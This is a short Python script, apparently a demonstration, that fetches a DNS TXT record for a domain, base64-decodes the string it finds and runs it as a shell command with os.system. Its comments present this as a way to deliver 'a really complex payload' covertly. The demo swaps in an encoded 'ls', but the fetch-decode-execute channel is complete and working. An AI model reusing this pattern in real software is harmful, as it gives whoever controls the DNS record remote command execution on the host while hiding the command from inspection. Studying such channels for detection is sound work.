#!/usr/bin/env python

## first we choose a command that is available on all linux systems
# example host
import subprocess
import base64
import re
import os
##first we retrieve our payload
x= subprocess.Popen(["host","-t","txt","google.com"], stdout=subprocess.PIPE).communicate()[0]
x = x.decode()
y = re.findall('"([^"]*)"', x)[0]

print(y) ## for your understanding
##then we b64 decode it, b64 encoding allows us to send over a really complex payload
## to show its work, since we dont have a domain 
y = "bHM="
c= base64.b64decode(y)
print("our deofuscated payload")
print(c) ## for your understanding
##now execute command
print("our command result")
os.system(c)
